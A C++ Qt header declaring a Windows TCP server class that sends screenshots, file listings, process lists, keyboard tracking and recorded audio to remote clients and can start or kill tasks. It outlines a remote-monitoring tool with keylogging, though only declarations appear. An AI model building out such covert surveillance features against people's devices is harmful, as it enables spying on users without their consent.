
#ifndef SERVER_H
#define SERVER_H

#include <QObject>
#include <QString>
#include <QList>
#include <QtNetwork>
#include <Windows.h>
#include <iostream>
#include <sstream>

#include <QPixmap>
#include <QFileSystemModel>
#include <QTimer>
#include <QStandardPaths>
#include <QDirIterator>

#include "audiorecorder.h"
#include "fileExplorer.h"
#include "psapi.h"

class Server : public QObject
{
    Q_OBJECT
public:
    explicit Server(QObject *parent = nullptr);
    void send_audio_file(QTcpSocket* sender);
//    ~Server();
signals:
//    void connected();
//    void disconnected();
    void readyRead(const QString &cmdNumber);
    void display(const QPixmap &pic);
    void error(QAbstractSocket::SocketError socketError);

private slots:
    void readMessage();
    void newConnection();
    void disconnected();
//    void processData();
//    void sendProcesses();
public:
//    QTcpServer *getServer();
private:
    void initServer();
    void stream(QTcpSocket* clientConnection);
    void sendMessage(QTcpSocket* clientSocket, const QString &cmdNumber, QString type);
    void sendScreenshot(QTcpSocket* clientSocket, const QPixmap &screenshot, QString type);
    void sendFileStructure(QTcpSocket* clientSocket, const QStringList &fileStruct);
    void sendProcesses(QTcpSocket* clientSocket);
    void sendKeyboardTrack(QTcpSocket* clientSocket);
    void sendApplications(QTcpSocket* clientSocket);
    void sendRunningApplications(QTcpSocket* sender);

    void startTask(QString taskToStart);
    void killTaskName(QString taskToKill);
    void killTaskPID(QString pidToKill);
public:
    QStringList adapterNamesList;
    QStringList ipAddressList;
    QString port;
private:

    QTcpServer *tcpServer = nullptr;
    QDataStream in;

    QProcess *processKeyboardTrack;
    QProcess *processListProcesses;
    QProcess *processListApps;
    QProcess *processListRunningApps;
    AudioRecorder *recorder = nullptr;
    QTimer *timer = nullptr;
    QList<QTcpSocket*> clients;

    fileExplorer *myFileExplorer = nullptr;

//    HHOOK mouseHook;

//static    LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
//    void startHook();
//    void stopHook();
};

#endif // SERVER_H
